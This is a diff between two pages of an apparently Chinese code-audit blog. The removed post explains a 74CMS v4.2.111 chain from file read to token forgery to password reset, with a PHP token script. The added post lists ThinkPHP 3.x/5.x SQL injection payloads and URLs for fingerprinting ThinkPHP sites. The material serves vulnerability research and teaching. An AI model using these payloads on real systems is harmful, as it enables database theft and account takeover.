@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="CMS," />
+  <meta name="keywords" content="代码审计," />
 
 
 
@@ -79,27 +79,21 @@
 
 
 
-<meta name="description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
-<meta name="keywords" content="CMS">
+<meta name="description" content="今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。   今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注然后自己绕不过有绕过的大佬欢迎交流。 ##版本:3.x tp3.2.3">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
-<meta property="og:url" content="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/index.html">
+<meta property="og:title" content="代码审计 | Thinkphp3.x&#x2F;5.x框架审计总结">
+<meta property="og:url" content="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta property="og:description" content="今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。   今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注然后自己绕不过有绕过的大佬欢迎交流。 ##版本:3.x tp3.2.3">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png">
-<meta property="og:updated_time" content="2018-10-10T05:54:50.380Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/znarexfdy7bxxmqjevut7nen/image_1cq3i0btnbs51tsp139t1q61dhn1p.png">
+<meta property="og:updated_time" content="2018-10-18T13:20:54.347Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
-<meta name="twitter:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
-<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
+<meta name="twitter:title" content="代码审计 | Thinkphp3.x&#x2F;5.x框架审计总结">
+<meta name="twitter:description" content="今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。   今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注然后自己绕不过有绕过的大佬欢迎交流。 ##版本:3.x tp3.2.3">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png">
 
 
 
@@ -129,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/"/>
 
 
 
 
 
-  <title>代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置 | P0rZ9's blog</title>
+  <title>代码审计 | Thinkphp3.x/5.x框架审计总结 | P0rZ9's blog</title>
   
 
 
@@ -246,7 +240,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/Thinkphp3.x_5.x框架审计总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -263,7 +257,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | Thinkphp3.x/5.x框架审计总结</h1>
         
 
         <div class="post-meta">
@@ -275,8 +269,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
-                2018-10-10
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-18T08:15:41+08:00">
+                2018-10-18
               </time>
             
 
@@ -318,61 +312,25 @@
       
 
       
-        <hr>
-<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
-<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
-<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
-<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
-<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
-<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
-</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
-<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
-// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
-// 经过 passport_key() 函数处理后的返回值
-$txt = passport_key(base64_decode($txt), $key);
-// 变量初始化
-$tmp = &apos;&apos;;
-// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
-for ($i = 0; $i &lt; strlen($txt); $i++) {
-    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
-    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
-    $tmp .= $txt[$i] ^ $txt[++$i];
-}
-// 返回 $tmp 的值作为结果
-return $tmp;
-</code></pre><p>}</p>
-<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
-<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
-<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
-<p>可看到修改成功。</p>
-<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
-<p>4.现在利用漏洞就很简单了</p>
-<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
-</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
-<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
-<p>2.我们本地加密得到<code>token</code>:</p>
-<pre><code>#demo.php
-&lt;?php
-
-function get_token($pwdhash){
-    $token = encrypt($pwdhash,$pwdhash);
-    var_dump($token);
-
-}
-function encrypt($txt, $key = &apos;_qscms&apos;) {
-    ...
-}
-function passport_key($txt, $encrypt_key) {
-   ...
-}
-
-$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
-$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
-get_token($data[&apos;PWDHASH&apos;]);
-?&gt;
-</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
-<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
-
+        <blockquote>
+<p>今天重新返回去看了下前几天复现几个TP框架的洞,总结总结。</p>
+</blockquote>
+<hr>
+<p>今天重新返回去复现TP的洞,发现5.0.10那处盲注复现不了,经过调试发现是自己例子写错大小写导致绕过了系统的判断才产生漏洞 尴尬啊。原文:<br><a href="https://p0rz9.github.io/2018/09/25/thinkphp5.0.10%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4%E4%B8%8D%E5%85%A8%E5%AF%BC%E8%87%B4%E4%B8%80%E5%A4%84%E7%9B%B2%E6%B3%A8/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致一处盲注</a><br>然后自己绕不过<br><img src="http://static.zybuluo.com/chhyx/m6dz5oxp4xm30v76ioiizzrc/image_1cq3l6los507172715g41e5lirp5f.png" alt="image_1cq3l6los507172715g41e5lirp5f.png-45.9kB"><br>有绕过的大佬欢迎交流。</p>
+<p>##<strong>版本:3.x</strong></p>
+<p><strong>tp3.2.3 bind 注入</strong><br><strong>漏洞成因:</strong><code>当where条件可控时,parseWhereItem()的inc操作直接拼接可控值$val造成注入</code><br><strong>payload:</strong><code>id[]=bind&amp;id[]=0 and (updatexml(1,concat(0x7e,(select%20user()),0x7e),1))</code><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
+<p><strong>tp&lt;=3.2.4 order by注入</strong><br><strong>漏洞成因:</strong><code>parseOrder()处理函数直接拼接传进来的字符串</code><br><img src="http://static.zybuluo.com/chhyx/znarexfdy7bxxmqjevut7nen/image_1cq3i0btnbs51tsp139t1q61dhn1p.png" alt="image_1cq3i0btnbs51tsp139t1q61dhn1p.png-40.8kB"><br><strong>payload:</strong><br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
+<p><strong>ThinkPHP 3.2.3 find_select_delete注入</strong><br><strong>成因:</strong><code>$this-&gt;_parseOptions($options);方法进行了参数合并又没有二次校验导致的注入</code><br><strong>payload:</strong><code>?id[where]=id = 1 and updatexml(0,concat(0xa,user()),0)</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/29/Thinkphp3.2%20find_delete_selete%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/29/Thinkphp3.2_find_delete_selete注入分析/</a></p>
+<p>##<strong>版本:5.x</strong><br><strong>1.thinkphp5.0.9 鸡肋SQL注入(PDo预处理)+信息泄露</strong><br><strong>成因:</strong><code>debug开启造成信息泄露+parseWhereItem()的in操作对$value无过滤且直接拼接</code><br><strong>payload:</strong><code>?id[0,updatexml(0,concat(0xa,user()),0)]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/19/ThinkPHP%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E6%B3%84%E9%9C%B2%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81+%E9%B8%A1%E8%82%8Bsql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入</a></p>
+<p><strong>2.thinkphp5.0.10 filterExp过滤不全导致注入</strong><br><strong>成因:</strong><code>助手函数input默认调用的filterExp()函数过滤不全导致注入</code><br><strong>payload:</strong><code>user[0]=not like&amp;user[1][0]=aaa&amp;user[1][8]=bbb&amp;user[2]=) and 1=2 union select 1,user(),3 from user--</code><br><strong>参考链接:</strong><a href="http://static.zybuluo.com/chhyx/81w6j9hqbr86tcsy5wpouq26/image_1cq3gbi4g1v0n1tqc15jf12191o80p.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/25/thinkphp5.0.10函数过滤不全导致注入</a></p>
+<p><strong>3.thinkphp5.0.14/15   insert/update注入(鸡肋)</strong><br><strong>成因:</strong><code>若传入参数为inc,parseData()函数会将将$val[1]与$val[2]拼接直接拼接导致注入</code><br><strong>payload:</strong><code>?name[0]=inc&amp;name[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;name[2]=1</code><br><strong>参考链接:</strong><a href="https://p0rz9.github.io/2018/09/15/ThinkPHP%E6%A1%86%E6%9E%B6%205.0.x%20sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/15/ThinkPHP框架%205.0.x%20sql注入</a></p>
+<p><strong>4.thinkphp5.x order by注入(鸡肋)</strong><br><strong>成因:</strong><code>与tp&lt;=3.2.4 order by注入成因类似</code><br><strong>payload:</strong><code>order[id</code>, 2) and updatexml(1,concat(0x3a,user()),1)– a][0]=111`<br><strong>参考链接:</strong><a href="https://xz.aliyun.com/t/2812#toc-4" target="_blank" rel="noopener">ThinkPHP-漏洞分析集合</a></p>
+<p><strong>识别基于THINKPHP框架的CMS:</strong></p>
+<pre><code>http://xxxx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a
+http://xxxx/4e5e5d7364f443e28fbf0d3ae744a59a
+http://xxxxx/ThinkPHP/logo.png
+http://xxxx/ThinkPHP/LICENSE.txt
+</code></pre>
       
     </div>
     
@@ -389,7 +347,7 @@ get_token($data[&apos;PWDHASH&apos;]);
       
         <div class="post-tags">
           
-            <a href="/tags/CMS/" rel="tag"># CMS</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -402,8 +360,8 @@ get_token($data[&apos;PWDHASH&apos;]);
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" rel="next" title="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
-                <i class="fa fa-chevron-left"></i> 代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本
+              <a href="/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/" rel="next" title="代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行">
+                <i class="fa fa-chevron-left"></i> 代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行
               </a>
             
           </div>
@@ -411,10 +369,6 @@ get_token($data[&apos;PWDHASH&apos;]);
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/12/PHP基础知识/" rel="prev" title="基础知识 | PHP基础知识">
-                基础知识 | PHP基础知识 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
